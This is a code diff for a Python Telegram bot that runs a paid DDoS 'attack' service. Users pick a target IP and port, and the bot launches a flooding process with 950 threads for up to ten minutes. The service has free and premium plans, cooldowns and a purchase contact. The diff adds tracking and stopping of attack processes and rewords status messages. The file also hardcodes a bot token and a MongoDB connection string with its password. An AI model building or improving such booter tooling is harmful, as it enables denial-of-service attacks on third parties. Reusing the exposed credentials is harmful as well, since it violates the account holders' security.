@@ -21,7 +21,7 @@ logging.basicConfig(
 TOKEN = '7232868612:AAEE686letBrsPMdJ28S1QJv51MXY2B5lNc'
 MONGO_URI = 'mongodb+srv://zeni:1I8uJt78Abh4K5lo@zeni.v7yls.mongodb.net/?retryWrites=true&w=majority&appName=zeni'
 ADMIN_IDS = [8167507955]
-OWNER_USERNAME = "@seedhe_maut_bot"
+OWNER_USERNAME = "seedhe_maut_bot"  # Fixed: removed @ symbol to prevent Telegram from hiding underscore
 BLOCKED_PORTS = [8700, 20000, 443, 17500, 9031, 20002, 20001]
 MAX_ATTACK_DURATION = 600  # 10 minutes
 THREADS_COUNT = 950
@@ -40,7 +40,7 @@ bot = telebot.TeleBot(TOKEN)
 
 # Global variables
 user_attack_details = {}
-attack_cooldowns = {}
+attack_processes = {}  # Track attack processes by user_id
 
 def is_user_admin(user_id):
     return user_id in ADMIN_IDS
@@ -92,6 +92,9 @@ def run_attack_command_sync(user_id, target_ip, target_port):
             stderr=subprocess.PIPE
         )
         
+        # Store the process for potential stopping
+        attack_processes[user_id] = process
+        
         logging.info(f"Attack started on {target_ip}:{target_port} with PID {process.pid}")
         
         # Wait for attack to complete or timeout
@@ -99,6 +102,7 @@ def run_attack_command_sync(user_id, target_ip, target_port):
         
         # Clean up
         active_attacks_collection.delete_one({"_id": attack_id})
+        attack_processes.pop(user_id, None)
         
         # Set cooldown
         cooldowns_collection.update_one(
@@ -111,6 +115,7 @@ def run_attack_command_sync(user_id, target_ip, target_port):
     except subprocess.TimeoutExpired:
         process.kill()
         active_attacks_collection.delete_one({"_id": attack_id})
+        attack_processes.pop(user_id, None)
         cooldowns_collection.update_one(
             {"user_id": user_id},
             {"$set": {"ends_at": datetime.now() + timedelta(seconds=COOLDOWN_DURATION)}},
@@ -119,6 +124,25 @@ def run_attack_command_sync(user_id, target_ip, target_port):
         return True
     except Exception as e:
         logging.error(f"Error in attack command: {e}")
+        return False
+
+def stop_user_attack(user_id):
+    try:
+        # Stop the process if running
+        if user_id in attack_processes:
+            process = attack_processes[user_id]
+            process.kill()
+            attack_processes.pop(user_id, None)
+        
+        # Remove from active attacks
+        active_attacks_collection.delete_many({"user_id": user_id})
+        
+        # Remove attack details
+        user_attack_details.pop(user_id, None)
+        
+        return True
+    except Exception as e:
+        logging.error(f"Error stopping attack: {e}")
         return False
 
 def create_main_menu():
@@ -156,7 +180,7 @@ Use /help to see available commands.
     bot.send_message(chat_id, welcome_msg, parse_mode='Markdown', reply_markup=create_main_menu())
 
 def send_help_message(chat_id):
-    help_msg = """
+    help_msg = f"""
 🆘 *Help Center* 🆘
 
 *Available Commands:*
@@ -170,13 +194,15 @@ def send_help_message(chat_id):
 /approve <user_id> <plan> <days> - Approve user
 /disapprove <user_id> - Remove user approval
 /stats - Show bot statistics
+
+👤 *Owner:* @{OWNER_USERNAME}
 """
     bot.send_message(chat_id, help_msg, parse_mode='Markdown')
 
 def send_plan_info(chat_id, user_id):
     plan = get_user_plan(user_id)
     if plan == 0:
-        plan_msg = """
+        plan_msg = f"""
 📊 *Your Plan: FREE*
 
 🔹 *Limitations:*
@@ -185,6 +211,8 @@ def send_plan_info(chat_id, user_id):
 - No support
 
 💎 *Upgrade your plan for full features!*
+
+👤 *Contact:* @{OWNER_USERNAME}
 """
     else:
         user_data = users_collection.find_one({"user_id": user_id})
@@ -216,6 +244,7 @@ def show_stats(chat_id):
 👥 *Total Users:* {total_users}
 💎 *Premium Users:* {premium_users}
 ⚡ *Active Attacks:* {active_attacks_count}
+👤 *Owner:* @{OWNER_USERNAME}
 """
     bot.send_message(chat_id, stats_msg, parse_mode='Markdown')
 
@@ -267,6 +296,7 @@ def mystats_command(message):
 🔸 *Cooldown:* {format_time(cooldown_remaining) if cooldown_remaining > 0 else "Ready"}
 🔸 *Last Attack:* {user_data.get('last_attack', 'Never')}
 🔸 *Account Valid Until:* {user_data.get('valid_until', 'Not specified')}
+👤 *Owner:* @{OWNER_USERNAME}
 """
     bot.send_message(message.chat.id, stats_msg, parse_mode='Markdown')
 
@@ -299,7 +329,7 @@ def buy_command(message):
 
 📌 *Custom plans available*
 
-Contact {OWNER_USERNAME} to purchase or for more information.
+👤 *Contact:* @{OWNER_USERNAME} to purchase or for more information.
 """
     markup = InlineKeyboardMarkup()
     markup.add(InlineKeyboardButton("📩 Contact Owner", url=f"tg://user?id={ADMIN_IDS[0]}"))
@@ -475,20 +505,21 @@ Example:
             
         elif call.data == "stop_attack":
             user_id = call.from_user.id
-            attack_details = user_attack_details.get(user_id)
-            
-            if not attack_details:
-                bot.answer_callback_query(call.id, "❌ No active attack found!", show_alert=True)
-                return
-            
-            target_ip, target_port = attack_details
-            active_attacks_collection.delete_many({
-                "user_id": user_id,
-                "target_ip": target_ip,
-                "target_port": target_port
-            })
-            bot.answer_callback_query(call.id, f"🛑 Attack stopped on {target_ip}:{target_port}")
-            user_attack_details.pop(user_id, None)
+            if stop_user_attack(user_id):
+                bot.answer_callback_query(call.id, "✅ All your attacks have been stopped", show_alert=True)
+                
+                # Edit the original attack message if possible
+                try:
+                    bot.edit_message_text(
+                        chat_id=call.message.chat.id,
+                        message_id=call.message.message_id,
+                        text="🛑 *Attack Stopped*",
+                        parse_mode='Markdown'
+                    )
+                except:
+                    pass
+            else:
+                bot.answer_callback_query(call.id, "❌ No active attacks found or failed to stop", show_alert=True)
                 
         elif call.data == "help":
             send_help_message(call.message.chat.id)
@@ -573,6 +604,21 @@ Example:
                 )
                 return
 
+            # Show immediate response
+            bot.answer_callback_query(
+                call.id,
+                "⚡ Attack is being prepared... Please wait",
+                show_alert=False
+            )
+            
+            # Edit the message to show attack is starting
+            bot.edit_message_text(
+                chat_id=call.message.chat.id,
+                message_id=call.message.message_id,
+                text=f"🚀 *Starting attack on {target_ip}:{target_port}...*",
+                parse_mode='Markdown'
+            )
+
             # Run attack in a separate thread to avoid blocking
             import threading
             def attack_thread():
@@ -589,7 +635,7 @@ Example:
                     
                     bot.edit_message_text(
                         f"""
-✅ *Attack Launched!*
+✅ *Attack Launched Successfully!*
 
 🔹 *Target:* `{target_ip}:{target_port}`
 🔹 *Duration:* `{MAX_ATTACK_DURATION//60} minutes`
@@ -603,16 +649,14 @@ Example:
                         parse_mode='Markdown'
                     )
                 else:
-                    bot.answer_callback_query(call.id, "❌ Failed to start attack!", show_alert=True)
+                    bot.edit_message_text(
+                        "❌ *Failed to start attack!*",
+                        call.message.chat.id,
+                        call.message.message_id,
+                        parse_mode='Markdown'
+                    )
             
             threading.Thread(target=attack_thread).start()
-            
-            # Show immediate response
-            bot.answer_callback_query(
-                call.id,
-                "⚡ Attack is being prepared... Please wait",
-                show_alert=False
-            )
                 
         elif call.data == "cancel_attack":
             bot.delete_message(call.message.chat.id, call.message.message_id)
